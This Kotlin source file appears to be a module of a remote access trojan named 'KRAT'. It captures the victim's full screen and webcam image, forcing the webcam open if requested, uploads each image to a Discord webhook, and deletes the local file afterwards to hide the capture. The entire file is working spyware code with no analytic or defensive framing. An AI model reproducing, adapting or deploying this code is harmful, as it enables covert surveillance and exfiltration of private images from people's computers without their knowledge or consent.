import services.Discord
import java.awt.Rectangle
import java.awt.Robot
import java.awt.Toolkit
import java.io.File
import javax.imageio.ImageIO

object Screen {
    fun sendScreenshot() {
        val file = File("C:\\Users\\${KRAT.user}\\Downloads\\screenshot.png")
        val image = Robot().createScreenCapture(Rectangle(Toolkit.getDefaultToolkit().screenSize))
        ImageIO.write(image, "png", file)

        Discord.webhook().apply {
            attachments.add(file)
            execute()
        }

        file.delete()
    }

    fun sendWebcam(force: Boolean = false) {
        val file = File("C:\\Users\\${KRAT.user}\\Downloads\\webcam.png")
        val cam = com.github.sarxos.webcam.Webcam.getDefault()
        if (!force && !cam.isOpen) return
        if (!cam.isOpen) cam.open()
        ImageIO.write(cam.image, "png", file)
        cam.close()
        Discord.webhook().apply {
            attachments.add(file)
            execute()
        }
        file.delete()
    }
}